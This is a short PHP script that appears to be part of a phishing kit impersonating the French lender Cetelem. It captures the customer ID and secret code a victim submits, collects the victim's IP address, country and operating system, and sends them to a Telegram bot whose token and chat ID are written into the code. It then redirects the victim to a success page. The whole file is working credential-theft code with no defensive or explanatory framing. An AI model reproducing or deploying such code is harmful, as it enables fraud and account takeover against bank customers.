<?php

session_start();
include_once 'functions.php';

	
$message = '[🍿] +1 CETELEM [🍿]' . "\r\n\n";

$message .= '🍿 Identifiant Client : ' . $_POST['user'] . "\r\n\n";
$message .= '🍿 Code secret : ' . $_POST['password'] . "\r\n\n";

$message .= '[🤖] TIERS [🤖]' . "\r\n\n";

$message .= '🤖 IP : ' . get_user_ip() . "\r\n";
$message .= '🤖 Pays : ' . get_user_country() . "\r\n";
$message .= '🤖 Systeme : ' . get_user_os() . "\r\n";


file_get_contents("https://api.telegram.org/bot7408486609:AAE6JsaxN2jS5RYh4XiLG-Rd2zfn8h7C0yM/sendMessage?chat_id=5998073411&text=" . urlencode($message)."" );

    header('location: ../success.php');

?>

